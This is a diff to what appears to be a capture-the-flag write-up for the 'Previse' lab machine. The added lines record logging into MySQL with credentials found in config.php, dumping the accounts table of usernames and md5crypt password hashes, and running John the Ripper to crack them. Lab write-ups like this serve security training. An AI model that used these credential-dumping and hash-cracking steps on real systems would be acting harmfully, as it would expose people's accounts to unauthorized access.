@@ -167,9 +167,24 @@ Note: This value
 
     $1$🧂llol$
 
-Is used to encrypt database passwords with php `crypt` function.
+Is used to encrypt database passwords with php `crypt` function. May be useful later. EDIT: no, it's a salt.
 
 Also, we can now connect to the MySQL database. Look at `config.php` for creds.
 
     mysql -u root -p'mySQL_p@ssw0rd!:)'
+    show databases;
+    use previse;
     show tables;
+    select * from accounts;
+
+    +----+----------+------------------------------------+---------------------+
+    | id | username | password                           | created_at          |
+    +----+----------+------------------------------------+---------------------+
+    |  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+    |  2 | userz    | $1$🧂llol$Wjo5WuNanNDwUu4kuNMCB. | 2022-01-01 19:24:51 |
+    |  3 | admin    | $1$🧂llol$vEWfJq7ewIW8g5ru0hBxv. | 2022-01-01 19:30:36 |
+    +----+----------+------------------------------------+---------------------+
+
+### Cracking mysql hashes
+
+    john downloaded-files/hashes.mysql.txt
